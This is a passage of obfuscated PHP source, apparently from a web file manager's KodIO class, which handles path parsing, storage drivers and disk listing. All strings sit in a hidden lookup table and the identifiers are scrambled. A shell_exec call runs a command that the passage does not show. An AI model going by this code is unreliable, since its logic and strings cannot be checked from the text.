$óŞ„÷ˆ÷[8]) . $óŞ„÷ˆ÷[8]; file_put_contents($óÉÕÀä¶ . $óŞ„÷ˆ÷[1319], $óŞ„÷ˆ÷[12]); file_put_contents(DATA_PATH . $óŞ„÷ˆ÷[1319], $óŞ„÷ˆ÷[12]); Model($óŞ„÷ˆ÷[1385])->set($óŞ„÷ˆ÷[1386], $óÉÕÀä¶); return $óÉÕÀä¶; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\122\145\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\106\x69\154\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\151\154\145\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\x70\122\x6f\157\164\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\123\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\x53\150\x61\x72\145\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\145\124\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\x49\x74\x65\x6d\114\x69\x6e\x6b\x7d"; const KOD_SHARE_OUTER = "\x7b\x73\150\x61\162\x65\111\164\x65\x6d\x4f\x75\164\x7d"; const KOD_SEARCH = "\173\x73\x65\141\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\x6b\x7d"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\122\145\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\145\162\175"; public static function typeList() { $ÃÇ©ÄİË =& $_SERVER[±Ö‰ô½¯]; return array($ÃÇ©ÄİË[1388] => self::KOD_SOURCE, $ÃÇ©ÄİË[1389] => self::KOD_USER_RECYCLE, $ÃÇ©ÄİË[1390] => self::KOD_USER_FAV, $ÃÇ©ÄİË[1391] => self::KOD_USER_FILE_TAG, $ÃÇ©ÄİË[1392] => self::KOD_USER_FILE_TYPE, $ÃÇ©ÄİË[1393] => self::KOD_GROUP_ROOT_SELF, $ÃÇ©ÄİË[1394] => self::KOD_USER_SHARE, $ÃÇ©ÄİË[1395] => self::KOD_USER_SHARE_LINK, $ÃÇ©ÄİË[1396] => self::KOD_USER_SHARE_TO_ME, $ÃÇ©ÄİË[1397] => self::KOD_SHARE_ITEM, $ÃÇ©ÄİË[1398] => self::KOD_SHARE_LINK, $ÃÇ©ÄİË[1399] => self::KOD_SHARE_OUTER, $ÃÇ©ÄİË[1400] => self::KOD_SEARCH, $ÃÇ©ÄİË[1401] => self::KOD_BLOCK, $ÃÇ©ÄİË[1402] => self::KOD_IO, $ÃÇ©ÄİË[1403] => self::KOD_USER_RECENT, $ÃÇ©ÄİË[1404] => self::KOD_USER_DRIVER); } public static function parse($ş …Ùõ) { $©ıò¯ö× =& $_SERVER[±Ö‰ô½¯]; $ş …Ùõ = self::clear($ş …Ùõ); $¿ë‘·¯ = array_values(self::typeList()); preg_match($©ıò¯ö×[1405], $ş …Ùõ, $×Ó÷Á™ì); $Î¿†œ†« = array($©ıò¯ö×[508] => !1, $©ıò¯ö×[1406] => !1, $©ıò¯ö×[505] => !1, $©ıò¯ö×[87] => $ş …Ùõ, $©ıò¯ö×[1303] => !1, $©ıò¯ö×[1302] => $©ıò¯ö×[12]); if (is_array($×Ó÷Á™ì) && count($×Ó÷Á™ì) == 5) { $ Í¥ïğ† = $©ıò¯ö×[1407] . $×Ó÷Á™ì[2] . $©ıò¯ö×[404]; if (in_array($ Í¥ïğ†, $¿ë‘·¯)) { $Î¿†œ†«[$©ıò¯ö×[1303]] = $×Ó÷Á™ì[1]; $Î¿†œ†«[$©ıò¯ö×[33]] = $ Í¥ïğ†; $Î¿†œ†«[$©ıò¯ö×[1408]] = substr($ Í¥ïğ†, 1, -1); $Î¿†œ†«[$©ıò¯ö×[484]] = $×Ó÷Á™ì[3]; } $Î¿†œ†«[$©ıò¯ö×[1302]] = $×Ó÷Á™ì[4]; } if ($Î¿†œ†«[$©ıò¯ö×[508]] == self::KOD_SOURCE) { $Î¿†œ†«[$©ıò¯ö×[484]] = intval($Î¿†œ†«[$©ıò¯ö×[484]]); $Î¿†œ†«[$©ıò¯ö×[1306]] = $Î¿†œ†«[$©ıò¯ö×[484]]; } $ÃƒŠ½¢‡ = array($©ıò¯ö×[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $Î¿†œ†«[$©ıò¯ö×[1370]] = in_array($Î¿†œ†«[$©ıò¯ö×[33]], $ÃƒŠ½¢‡); return $Î¿†œ†«; } public static function isTruePath($çäËÒ¥) { $Éğ’ú´õ =& $_SERVER[±Ö‰ô½¯]; if (substr($çäËÒ¥, 0, 1) != $Éğ’ú´õ[1407]) { return !0; } if (strpos($çäËÒ¥, $Éğ’ú´õ[495]) === 0) { return !0; } if (strpos($çäËÒ¥, $Éğ’ú´õ[1374]) === 0) { return !0; } if (strpos($çäËÒ¥, $Éğ’ú´õ[1409]) === 0) { return !0; } if (strpos($çäËÒ¥, $Éğ’ú´õ[1410]) === 0) { return !0; } if (strpos($çäËÒ¥, $Éğ’ú´õ[1411]) === 0) { return !0; } if (strpos($çäËÒ¥, $Éğ’ú´õ[1412]) === 0) { return !0; } return !1; } public static function clear($¸†öàİ‰) { $Şã¢Óˆ =& $_SERVER[±Ö‰ô½¯]; $¸†öàİ‰ = str_replace(array($Şã¢Óˆ[1196], $Şã¢Óˆ[287]), $Şã¢Óˆ[53], $¸†öàİ‰); $¸†öàİ‰ = str_replace($Şã¢Óˆ[98], $Şã¢Óˆ[8], $¸†öàİ‰); $®û¤–ùÌ = $Şã¢Óˆ[1413]; if (substr($¸†öàİ‰, 0, 3) == $Şã¢Óˆ[1414]) { $¸†öàİ‰ = substr($¸†öàİ‰, 3); } while (strstr($¸†öàİ‰, $®û¤–ùÌ)) { $¸†öàİ‰ = str_replace($®û¤–ùÌ, $Şã¢Óˆ[8], $¸†öàİ‰); } $¸†öàİ‰ = preg_replace($Şã¢Óˆ[1415], $Şã¢Óˆ[8], $¸†öàİ‰); if ($¸†öàİ‰ == $Şã¢Óˆ[8]) { return $Şã¢Óˆ[8]; } $¸†öàİ‰ = rtrim($¸†öàİ‰, $Şã¢Óˆ[8]); return $¸†öàİ‰; } public static function pathTrue($²üß¶ı) { $ÖµèìïÖ =& $_SERVER[±Ö‰ô½¯]; if (!$²üß¶ı) { return $ÖµèìïÖ[12]; } $²üß¶ı = str_replace($ÖµèìïÖ[256], $ÖµèìïÖ[8], str_replace($ÖµèìïÖ[1416], $ÖµèìïÖ[8], $²üß¶ı)); $²üß¶ı = str_replace($ÖµèìïÖ[256], $ÖµèìïÖ[8], str_replace($ÖµèìïÖ[1416], $ÖµèìïÖ[8], $²üß¶ı)); if (!strstr($²üß¶ı, $ÖµèìïÖ[1414])) { return $²üß¶ı; } $êª¹Ö‰‹ = explode($ÖµèìïÖ[8], $²üß¶ı); foreach ($êª¹Ö‰‹ as $–şÌÜ³ => $ä½øæ) { if ($ä½øæ !== $ÖµèìïÖ[1417]) { continue; } for ($º²Æ®‹¯ = $–şÌÜ³; $º²Æ®‹¯ >= 0; $º²Æ®‹¯--) { if ($êª¹Ö‰‹[$º²Æ®‹¯] === $ÖµèìïÖ[10] || $êª¹Ö‰‹[$º²Æ®‹¯] === $ÖµèìïÖ[1417] || $êª¹Ö‰‹[$º²Æ®‹¯] === -1) { continue; } if ($êª¹Ö‰‹[$º²Æ®‹¯] === $ÖµèìïÖ[12]) { $êª¹Ö‰‹[$–şÌÜ³] = -1; break; } $êª¹Ö‰‹[$–şÌÜ³] = -1; $êª¹Ö‰‹[$º²Æ®‹¯] = -1; break; } } $ŞÌá—é = array(); foreach ($êª¹Ö‰‹ as $ä½øæ) { if ($ä½øæ !== -1) { $ŞÌá—é[] = $ä½øæ; } } $Î¦ÑÂËØ = implode($ÖµèìïÖ[8], $ŞÌá—é); if (strpos($Î¦ÑÂËØ, $ÖµèìïÖ[1418]) === 0) { $Î¦ÑÂËØ = $ÖµèìïÖ[1414] . substr($Î¦ÑÂËØ, strlen($ÖµèìïÖ[1418])); } return $Î¦ÑÂËØ; } public static function pathUrlClear($áªåŠÛ) { $ÆÉ¨¸ÖÅ =& $_SERVER[±Ö‰ô½¯]; if (!$áªåŠÛ) { return $áªåŠÛ; } $áªåŠÛ = rawurldecode($áªåŠÛ); $áªåŠÛ = str_replace($ÆÉ¨¸ÖÅ[1416], $ÆÉ¨¸ÖÅ[8], $áªåŠÛ); if (strpos($áªåŠÛ, $ÆÉ¨¸ÖÅ[76]) > 0) { $áªåŠÛ = substr($áªåŠÛ, 0, strpos($áªåŠÛ, $ÆÉ¨¸ÖÅ[76])); } if (strpos($áªåŠÛ, $ÆÉ¨¸ÖÅ[1419]) > 0) { $áªåŠÛ = substr($áªåŠÛ, 0, strpos($áªåŠÛ, $ÆÉ¨¸ÖÅ[1419])); } return $áªåŠÛ; } public static function sourceID($¬ğô“Ÿ) { $ı¨ëóÑ› =& $_SERVER[±Ö‰ô½¯]; $Ì®¼–Í = self::parse($¬ğô“Ÿ); if ($Ì®¼–Í[$ı¨ëóÑ›[33]] !== self::KOD_SOURCE) { show_json(LNG($ı¨ëóÑ›[1420]), !1); } return $Ì®¼–Í[$ı¨ëóÑ›[484]]; } public static function make($¯½Ïâ¬Á) { if (!$¯½Ïâ¬Á) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¯½Ïâ¬Á)); } public static function makeShare($­§§Õ£ú, $Ú¥Ô”¨Ì) { return self::makePath(self::KOD_SHARE_ITEM, $­§§Õ£ú, $Ú¥Ô”¨Ì); } public static function makeFileTypePath($‘†‰çÏ) { return self::makePath(self::KOD_USER_FILE_TYPE, $‘†‰çÏ); } public static function makeFileTagPath($Ûòõˆ§Ö) { return self::makePath(self::KOD_USER_FILE_TAG, $Ûòõˆ§Ö); } public static function makePath($º›ß²Ê , $½óµÛÇ› = '', $ùÍ‹ª­ø = '') { $à•äÃ½Â =& $_SERVER[±Ö‰ô½¯]; $ƒ¨™ = substr($º›ß²Ê , 1, -1); $Ú×©ÑÂ« = $à•äÃ½Â[1421] . $ƒ¨™ . $à•äÃ½Â[1422] . $½óµÛÇ› . $à•äÃ½Â[1423]; $Ú×©ÑÂ« = $ùÍ‹ª­ø ? $Ú×©ÑÂ« . $ùÍ‹ª­ø . $à•äÃ½Â[8] : $Ú×©ÑÂ«; return $Ú×©ÑÂ«; } public static function hashPath($ùÈ¬«º®, $¿Äåóáû = false) { $Ğ¥™³ =& $_SERVER[±Ö‰ô½¯]; if (!$ùÈ¬«º®) { return $Ğ¥™³[12]; } $ÄŸ·ØÚµ = is_array($ùÈ¬«º®) ? $ùÈ¬«º® : IO::info($ùÈ¬«º®); $•—£ù­Â = _get($ÄŸ·ØÚµ, $Ğ¥™³[1424], $Ğ¥™³[12]); if (!$•—£ù­Â && isset($ÄŸ·ØÚµ[$Ğ¥™³[554]])) { $•—£ù­Â = $ÄŸ·ØÚµ[$Ğ¥™³[554]]; } if (!$•—£ù­Â && isset($ÄŸ·ØÚµ[$Ğ¥™³[237]])) { $•—£ù­Â = trim($ÄŸ·ØÚµ[$Ğ¥™³[237]], $Ğ¥™³[119]); } if ($•—£ù­Â) { return $•—£ù­Â; } if (!$•—£ù­Â && isset($ÄŸ·ØÚµ[$Ğ¥™³[193]]) && $ÄŸ·ØÚµ[$Ğ¥™³[193]]) { $ÄŸ·ØÚµ = IO::info(KodIO::make($ÄŸ·ØÚµ[$Ğ¥™³[193]])); $•—£ù­Â = _get($ÄŸ·ØÚµ, $Ğ¥™³[1424], $Ğ¥™³[12]); if (!$•—£ù­Â && isset($ÄŸ·ØÚµ[$Ğ¥™³[554]])) { $•—£ù­Â = $ÄŸ·ØÚµ[$Ğ¥™³[554]]; } } $ôõ£Êƒ = md5($ÄŸ·ØÚµ[$Ğ¥™³[87]] . $ÄŸ·ØÚµ[$Ğ¥™³[79]] . $ÄŸ·ØÚµ[$Ğ¥™³[88]]); $±™ö†ÔÕ = $ôõ£Êƒ . $Ğ¥™³[1425]; $•—£ù­Â = $•—£ù­Â ? $•—£ù­Â : Cache::get($±™ö†ÔÕ); if (!$•—£ù­Â && $¿Äåóáû) { $•—£ù­Â = IO::hashSimple($ÄŸ·ØÚµ[$Ğ¥™³[87]]); Cache::set($±™ö†ÔÕ, $•—£ù­Â ? $•—£ù­Â : $ôõ£Êƒ, 3600 * 24 * 30); } return $•—£ù­Â ? $•—£ù­Â : $ôõ£Êƒ; } public static function hashPathSafe($¿ÌØŒÏÁ, $î“’çÂ™ = false) { $¼‘å Èİ =& $_SERVER[±Ö‰ô½¯]; $·ÅÏ¸Îş = self::hashPath($¿ÌØŒÏÁ, $î“’çÂ™); return md5($·ÅÏ¸Îş . $¼‘å Èİ[1426] . Model($¼‘å Èİ[870])->get($¼‘å Èİ[871])); } public static function initSystemPath() { $ãİÓÈ¿¨ =& $_SERVER[±Ö‰ô½¯]; if (defined($ãİÓÈ¿¨[1427])) { return; } define($ãİÓÈ¿¨[1427], self::systemPath($ãİÓÈ¿¨[191])); define($ãİÓÈ¿¨[1428], self::systemPath($ãİÓÈ¿¨[1429])); define($ãİÓÈ¿¨[1430], self::systemPath($ãİÓÈ¿¨[1431])); define($ãİÓÈ¿¨[1432], self::systemPath($ãİÓÈ¿¨[1433])); IOHistory::bindEvent(); } public static function systemPath($ÎÒŠß‡) { $çÙØ©õ‹ =& $_SERVER[±Ö‰ô½¯]; $¨ä©†€ = $çÙØ©õ‹[1434] . ucfirst($ÎÒŠß‡); $•¶‰šáà = Model($çÙØ©õ‹[870])->get($¨ä©†€); if ($•¶‰šáà) { return $•¶‰šáà; } if ($ÎÒŠß‡ == $çÙØ©õ‹[191]) { $•¶‰šáà = self::make(Model($çÙØ©õ‹[930])->systemRootPathAdd($çÙØ©õ‹[625])); } else { $•¶‰šáà = self::systemPath($çÙØ©õ‹[191]); $ŸøİÒ = self::sourceID($•¶‰šáà); $•¶‰šáà = self::make(Model($çÙØ©õ‹[930])->mkdir($ŸøİÒ, $ÎÒŠß‡)); } Model($çÙØ©õ‹[870])->set($¨ä©†€, $•¶‰šáà); return $•¶‰šáà; } public static function systemFolder($Ä‰—â‰µ) { $ŸÁó×½ã = IO_PATH_SYSTEM_SOURCE . $Ä‰—â‰µ; $÷ú÷· = Cache::get($ŸÁó×½ã); if (!$÷ú÷·) { $õ®Ô­Œ¨ = IO::infoFullSimple($ŸÁó×½ã); if (!$õ®Ô­Œ¨) { $÷ú÷· = IO::mkdir($ŸÁó×½ã, REPEAT_SKIP); } else { $÷ú÷· = $õ®Ô­Œ¨[$_SERVER[±Ö‰ô½¯][87]]; } Cache::set($ŸÁó×½ã, $÷ú÷·, 3600 * 10); } return $÷ú÷·; } public static function defaultDriver() { return Model($_SERVER[±Ö‰ô½¯][865])->defaultDriver(); } public static function defaultDriverInit() { $œÉ×›Œ =& $_SERVER[±Ö‰ô½¯]; static $ÚÊœ‰½œ = false; if ($ÚÊœ‰½œ) { return $ÚÊœ‰½œ; } $³Æ€‚“® = self::defaultDriver(); $ÚÊœ‰½œ = IO::init($œÉ×›Œ[1435] . $³Æ€‚“®[$œÉ×›Œ[484]] . $œÉ×›Œ[1423]); return $ÚÊœ‰½œ; } public static function fileTypeList() { $©ş–ë†İ =& $_SERVER[±Ö‰ô½¯]; $£ÑÌ•ŒØ = $GLOBALS[$©ş–ë†İ[6]][$©ş–ë†İ[1436]]; foreach ($£ÑÌ•ŒØ as $ëî“ÖÇ => $Î½Õ°Œ¿) { $„¢—ÏÕ¤ = $©ş–ë†İ[1437] . $ëî“ÖÇ; $ºÉÛñï» = LNG($„¢—ÏÕ¤); if ($„¢—ÏÕ¤ != $ºÉÛñï») { $£ÑÌ•ŒØ[$ëî“ÖÇ][$©ş–ë†İ[32]] = $ºÉÛñï»; } } return $£ÑÌ•ŒØ; } public static function ioFileDriverGet($£ßœ¼ÁÈ = '') { $¹¸ìÎù =& $_SERVER[±Ö‰ô½¯]; static $ ´¡÷§¦ = array(); static $ĞæÛášÍ = array(); static $²û·’£µ = array(); static $¿Ú»â´á = false; if ($¿Ú»â´á === !1) { $¿Ú»â´á = array($¹¸ìÎù[595] => array(), $¹¸ìÎù[682] => array()); $¹ĞÊÄüÉ = Model($¹¸ìÎù[1438])->get(!1, $¹¸ìÎù[1439]); foreach ($¹ĞÊÄüÉ as $ØëÁ¼ßÜ => $½á‰›Æº) { if (!$½á‰›Æº || $½á‰›Æº == $¹¸ìÎù[12]) { continue; } if (strstr($ØëÁ¼ßÜ, $¹¸ìÎù[1440])) { $¿·¾Üê  = str_replace($¹¸ìÎù[1440], $¹¸ìÎù[12], $ØëÁ¼ßÜ); $¿Ú»â´á[$¹¸ìÎù[595]][$¿·¾Üê ] = $½á‰›Æº; } else { if (strstr($ØëÁ¼ßÜ, $¹¸ìÎù[1441])) { $¿·¾Üê  = str_replace($¹¸ìÎù[1441], $¹¸ìÎù[12], $ØëÁ¼ßÜ); $¿Ú»â´á[$¹¸ìÎù[682]][$¿·¾Üê ] = $½á‰›Æº; } } } } $Ü¶¶ˆ—Œ = self::defaultDriver(); if (!$£ßœ¼ÁÈ || !$¿Ú»â´á[$¹¸ìÎù[595]] && !$¿Ú»â´á[$¹¸ìÎù[682]]) { return $Ü¶¶ˆ—Œ; } $‡·íã¶ = self::getPathSourceID($£ßœ¼ÁÈ); if (!$‡·íã¶) { return $Ü¶¶ˆ—Œ; } if (isset($ ´¡÷§¦[$‡·íã¶])) { return $ ´¡÷§¦[$‡·íã¶]; } $ÙŸ†ğë¦ = Model($¹¸ìÎù[930])->sourceInfo($‡·íã¶); $ß‡èŠ˜ = $ÙŸ†ğë¦[$¹¸ìÎù[586]]; $ÛÏ×ì÷ = array(); if (!$ÙŸ†ğë¦) { return $Ü¶¶ˆ—Œ; } if ($ÙŸ†ğë¦[$¹¸ìÎù[190]] == $¹¸ìÎù[91]) { if (isset($²û·’£µ[$ß‡èŠ˜])) { return $²û·’£µ[$ß‡èŠ˜]; } if (isset($¿Ú»â´á[$¹¸ìÎù[682]][$ß‡èŠ˜])) { $ ÃàÄéñ = Model($¹¸ìÎù[865])->driverInfo($¿Ú»â´á[$¹¸ìÎù[682]][$ß‡èŠ˜]); $Ü¶¶ˆ—Œ = $ ÃàÄéñ ? $ ÃàÄéñ : $Ü¶¶ˆ—Œ; $²û·’£µ[$ß‡èŠ˜] = $Ü¶¶ˆ—Œ; $ ´¡÷§¦[$‡·íã¶] = $Ü¶¶ˆ—Œ; return $Ü¶¶ˆ—Œ; } $ÛÏ×ì÷ = self::groupParentUser($ß‡èŠ˜); } else { if ($ÙŸ†ğë¦[$¹¸ìÎù[190]] == $¹¸ìÎù[521]) { $›Û”ï€á = Model($¹¸ìÎù[1442])->getInfo($ß‡èŠ˜); if ($›Û”ï€á) { $ÛÏ×ì÷ = explode($¹¸ìÎù[50], trim($›Û”ï€á[$¹¸ìÎù[601]], $¹¸ìÎù[50])); $ÛÏ×ì÷ = array_remove_value($ÛÏ×ì÷, $¹¸ìÎù[230]); $ÛÏ×ì÷[] = $ß‡èŠ˜; $ÛÏ×ì÷ = array_reverse($ÛÏ×ì÷); } } } foreach ($ÛÏ×ì÷ as $§´Â•ùë) { if (!isset($¿Ú»â´á[$¹¸ìÎù[595]][$§´Â•ùë])) { continue; } if (isset($ĞæÛášÍ[$§´Â•ùë])) { return $ĞæÛášÍ[$§´Â•ùë]; } $ ÃàÄéñ = Model($¹¸ìÎù[865])->driverInfo($¿Ú»â´á[$¹¸ìÎù[595]][$§´Â•ùë]); $Ü¶¶ˆ—Œ = $ ÃàÄéñ ? $ ÃàÄéñ : $Ü¶¶ˆ—Œ; $ĞæÛášÍ[$§´Â•ùë] = $Ü¶¶ˆ—Œ; break; } if ($ÙŸ†ğë¦[$¹¸ìÎù[190]] == $¹¸ìÎù[91]) { $²û·’£µ[$ß‡èŠ˜] = $Ü¶¶ˆ—Œ; } $ ´¡÷§¦[$‡·íã¶] = $Ü¶¶ˆ—Œ; return $Ü¶¶ˆ—Œ; } private static function getPathSourceID($¾Ûô‡¦ò) { $ËñÁÆêé =& $_SERVER[±Ö‰ô½¯]; static $èø¨ö¢” = array(); if (!$¾Ûô‡¦ò) { return $ËñÁÆêé[12]; } $§ƒƒ¦¦ = substr($¾Ûô‡¦ò, 0, strlen($ËñÁÆêé[495])) == $ËñÁÆêé[495]; $ø¹õºìÏ = substr($¾Ûô‡¦ò, 0, strlen($ËñÁÆêé[1409])) == $ËñÁÆêé[1409]; $“ßÜÛüã = substr($¾Ûô‡¦ò, 0, strlen($ËñÁÆêé[1410])) == $ËñÁÆêé[1410]; if (!$§ƒƒ¦¦ && !$ø¹õºìÏ && !$“ßÜÛüã) { return $ËñÁÆêé[12]; } $¬Ë˜òøÆ = self::parse($¾Ûô‡¦ò); $‚¹õä÷ = $¬Ë˜òøÆ[$ËñÁÆêé[1303]]; if ($§ƒƒ¦¦) { return $¬Ë˜òøÆ[$ËñÁÆêé[484]]; } if (isset($èø¨ö¢”[$‚¹õä÷])) { $†‚¾Ë‰æ = $èø¨ö¢”[$‚¹õä÷]; } else { $†‚¾Ë‰æ = IO::init($‚¹õä÷); $èø¨ö¢”[$‚¹õä÷] = $†‚¾Ë‰æ; } if (isset($†‚¾Ë‰æ->pathParse[$ËñÁÆêé[1306]])) { return $†‚¾Ë‰æ->pathParse[$ËñÁÆêé[1306]]; } return $ËñÁÆêé[12]; } private static function groupParentUser($ ÊÀÛñ) { $ÁÖ® ˆÆ =& $_SERVER[±Ö‰ô½¯]; $¶¾‡×ü´ = Model($ÁÖ® ˆÆ[614])->getInfo($ ÊÀÛñ); if (!$¶¾‡×ü´) { return array(); } $ŒÒıŠŠÁ = array_to_keyvalue($¶¾‡×ü´[$ÁÖ® ˆÆ[1443]], $ÁÖ® ˆÆ[12], $ÁÖ® ˆÆ[1444]); $Œ»º‹–£ = array(); foreach ($¶¾‡×ü´[$ÁÖ® ˆÆ[1443]] as $ÛÛË±ªÙ) { $Œ»º‹–£[] = $ÛÛË±ªÙ[$ÁÖ® ˆÆ[1444]]; $Ù¢“èÊ‚ = explode($ÁÖ® ˆÆ[50], trim($ÛÛË±ªÙ[$ÁÖ® ˆÆ[601]], $ÁÖ® ˆÆ[50])); $Ù¢“èÊ‚ = array_remove_value($Ù¢“èÊ‚, $ÁÖ® ˆÆ[230]); $Ù¢“èÊ‚ = array_reverse($Ù¢“èÊ‚); $Œ»º‹–£ = array_merge($Œ»º‹–£, $Ù¢“èÊ‚); } return array_unique($Œ»º‹–£); } public static function diskList($ï’Ú ™ = true) { $–‚¤ÔèÑ = $_SERVER[±Ö‰ô½¯][1445]; if ($ï’Ú ™) { $ò—Î‡†ù = Cache::get($–‚¤ÔèÑ); if (is_array($ò—Î‡†ù)) { return $ò—Î‡†ù; } } $ò—Î‡†ù = self::diskListGet(); Cache::set($–‚¤ÔèÑ, $ò—Î‡†ù, 60); return $ò—Î‡†ù; } public static function diskListGet() { $´€ì¢­ =& $_SERVER[±Ö‰ô½¯]; $´š³Ş¶Ş = array(); if ($GLOBALS[$´€ì¢­[6]][$´€ì¢­[1446]] == $´€ì¢­[1447]) { $³äÛ±İ = $´€ì¢­[1448]; for ($ô—Í×­£ = 0; $ô—Í×­£ < strlen($³äÛ±İ); $ô—Í×­£++) { $¸‹ç¼±Á = $³äÛ±İ[$ô—Í×­£] . $´€ì¢­[1449]; if (file_exists($¸‹ç¼±Á)) { $´š³Ş¶Ş[] = $¸‹ç¼±Á; } } return $´š³Ş¶Ş; } if (!function_exists($´€ì¢­[99])) { $´š³Ş¶Ş[] = $´€ì¢­[944]; return $´š³Ş¶Ş; } $÷Ê –’ = explode($´€ì¢­[287], shell_exec($´€ì¢­[1450])); array_shift($÷Ê –’); array_pop($÷Ê –’); $ŠÚèşôß = array($´€ì¢­[1451], $´€ì¢­[1452], $´€ì¢­[1453], $´€ì¢­[1454], $´€ì¢­[1455], $´€ì¢­[1456], $´€ì¢­[1457], $´€ì¢­[1458]); foreach ($÷Ê –’ as $İÔ¬”ƒ) { $åğ€û… = preg_split($´€ì¢­[1459], $İÔ¬”ƒ); $¸‹ç¼±Á = $åğ€û…[count($åğ€û…) - 1]; if (!strstr($åğ€û…[0], $´€ì¢­[1460]) || !$¸‹ç¼±Á) { continue; } $ĞäëÑÊ = rtrim($¸‹ç¼±Á, $´€ì¢­[8]) . $´€ì¢­[8]; $´š³Ş¶Ş[] = $ĞäëÑÊ; } return $´š³Ş¶Ş; } public static function isSameDisk($¿ä«ı¯Ì, $™ ¥…×“) { $é¡‰ŸäÙ =& $_SERVER[±Ö‰ô½¯]; if ($GLOBALS[$é¡‰ŸäÙ[6]][$é¡‰ŸäÙ[1446]] == $é¡‰ŸäÙ[1447]) { return strtolower(substr($¿ä«ı¯Ì, 0, 1)) == strtolower(substr($™ ¥…×“, 0, 1)); } $ˆÁÀ‰ì† = stat($¿ä«ı¯Ì); $ıÃ¦úñº = stat($™ ¥…×“); if ($ˆÁÀ‰ì† === !1 || $ıÃ¦úñº === !1) { return !1; } return $ˆÁÀ‰ì†[$é¡‰ŸäÙ[1461]] === $ıÃ¦úñº[$é¡‰ŸäÙ[1461]]; $Œ Ï½Ùê = self::diskList(); $ÊÔ¶’â = !1; $ş§Ğ¨ÃÖ = !1; sort($Œ Ï½Ùê); $Œ Ï½Ùê = array_reverse($Œ Ï½Ùê); $¿ä«ı¯Ì = rtrim($¿ä«ı¯Ì, $é¡‰ŸäÙ[8]) . $é¡‰ŸäÙ[8]; $™ ¥…×“ = rtrim($™ ¥…×“, $é¡‰ŸäÙ[8]) . $é¡‰ŸäÙ[8]; foreach ($Œ Ï½Ùê as $¯Í¸ÊĞ†) { $ ä¦¨›û = strlen($¯Í¸ÊĞ†); if (!$ÊÔ¶’â && substr($¿ä«ı¯Ì, 0, $ ä¦¨›û) == $¯Í¸ÊĞ†) { $ÊÔ¶’â = $¯Í¸ÊĞ†; } if (!$ş§Ğ¨ÃÖ && substr($™ ¥…×“, 0, $ ä¦¨›û) == $¯Í¸ÊĞ†) { $ş§Ğ¨ÃÖ = $¯Í¸ÊĞ†; } if ($ÊÔ¶’â && $ş§Ğ¨ÃÖ) { break; } } return $ÊÔ¶’â === $ş§Ğ¨ÃÖ; } public static function transferType($˜²  , $óù¤·§Ÿ) { $ÂØÈ¯ÎÂ =& $_SERVER[±Ö‰ô½¯]; $İâù¢Åó = self::driverType($˜²  ); $ƒºñØëã = self::driverType($óù¤·§Ÿ); if ($İâù¢Åó[$ÂØÈ¯ÎÂ[33]] == $ƒºñØëã[$ÂØÈ¯ÎÂ[33]] && $İâù¢Åó[$ÂØÈ¯ÎÂ[1462]] == $ƒºñØëã[$ÂØÈ¯ÎÂ[1462]]) { return $ÂØÈ¯ÎÂ[1463]; } if ($İâù¢Åó[$ÂØÈ¯ÎÂ[33]] == $ÂØÈ¯ÎÂ[978] && $ƒºñØëã[$ÂØÈ¯ÎÂ[33]] == $ÂØÈ¯ÎÂ[107]) { return $ÂØÈ¯ÎÂ[1331]; } if ($İâù¢Åó[$ÂØÈ¯ÎÂ[33]] == $ÂØÈ¯ÎÂ[107] && $ƒºñØëã[$ÂØÈ¯ÎÂ[33]] == $ÂØÈ¯ÎÂ[978]) { return $ÂØÈ¯ÎÂ[108]; } return $ÂØÈ¯ÎÂ[1464]; } public static function driverType($ı¥’¾æ‘) { $‡Û­©Œ =& $_SERVER[±Ö‰ô½¯]; $”µô§¥¤ = str_replace($‡Û­©Œ[1465], $‡Û­©Œ[12], strtolower($ı¥’¾æ‘->getType())); if ($”µô§¥¤ == $‡Û­©Œ[855] || $”µô§¥¤ == $‡Û­©Œ[1466] || $”µô§¥¤ == $‡Û­©Œ[1467]) { $Û²»æŞ = self::ioFileDriverGet($‡Û­©Œ[495] . $ı¥’¾æ‘->pathParse[$‡Û­©Œ[1306]] . $‡Û­©Œ[404]); $ı¥’¾æ‘ = IO::init($‡Û­©Œ[1435] . $Û²»æŞ[$‡Û­©Œ[484]] . $‡Û­©Œ[1423]); } else { if ($”µô§¥¤ == $‡Û­©Œ[1341] || $”µô§¥¤ == $‡Û­©Œ[1468]) { $ı¥’¾æ‘ = IO::init($ı¥’¾æ‘->pathParse[$‡Û­©Œ[1283]]); } } $Óü¯‹„ù = $ı¥’¾æ‘->path; $”µô§¥¤ = str_replace($‡Û­©Œ[1465], $‡Û­©Œ[12], strtolower($ı¥’¾æ‘->getType())); if ($”µô§¥¤ == $‡Û­©Œ[107]) { return array($‡Û­©Œ[33] => $‡Û­©Œ[107], $‡Û­©Œ[1462] => $‡Û­©Œ[12], $‡Û­©Œ[87] => $Óü¯‹„ù, $‡Û­©Œ[96] => $ı¥’¾æ‘); } return array($‡Û­©Œ[33] => $‡Û­©Œ[978], $‡Û­©Œ[1462] => $ı¥’¾æ‘->pathDriver, $‡Û­©Œ[87] => $Óü¯‹„ù, $‡Û­©Œ[96] => $ı¥’¾æ‘); } public static function pathDriverType($Œ®µİèâ) { return $Œ®µİèâ ? self::driverType(IO::init($Œ®µİèâ)) : !1; } public static function pathDriverLocal($Àñ¢Á£æ) { 